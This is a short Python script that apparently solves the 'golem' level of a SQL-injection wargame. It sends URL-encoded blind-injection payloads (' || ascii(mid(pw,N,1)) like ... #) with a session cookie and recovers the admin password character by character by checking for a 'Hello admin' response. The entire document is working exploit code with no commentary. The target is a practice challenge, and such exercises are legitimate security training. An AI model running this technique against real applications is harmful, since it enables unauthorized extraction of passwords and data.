import requests
cookies = {'PHPSESSID': 's3pme5nhda93k7jt7khal1al5u'}
length = 8
for a in range(1, length+1):
    for b in range(48,123):
        URL = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=%27%20||%20ascii(mid(pw,"+ str(a) +",1))like%20%27" +str(b)+"%27%20%23"
        res = requests.get(URL, cookies=cookies)

        if "<h2>Hello admin</h2>" in res.text:
            print(str(chr(b)))
            break

